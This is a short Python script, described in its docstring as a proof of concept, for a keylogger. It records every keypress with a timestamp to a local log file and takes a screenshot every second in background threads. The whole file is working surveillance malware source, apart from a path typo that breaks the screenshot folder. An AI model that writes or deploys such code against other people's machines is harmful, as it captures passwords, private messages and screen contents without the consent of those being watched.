#!/usr/bin/env python3

"""
Simple keylogger that stores keypresses and takes screenshots POC
"""

from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import time
import os

class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

# encapsulate all the functionality the monitor will have
class Monitor:
    pass

    # store keypresses
    def _on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write(f'{k}\t\t{time.time()}\n')

    # create log folders
    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')


    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    # screenshotting and storing screenshots
    def _screenshot(self):
        sct = mss() # take screenshot
        sct.shot(output='.logs/screenshots/{}.png'.format(time.time()))

    def run(self, interval=1):
        """
        Launch the keylogger and screenshot taker in two separate threads.
        Interval is the amount of time in seconds that occurs between screenshots.
        """
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()

if __name__ == '__main__':
    mon = Monitor()
    mon.run() 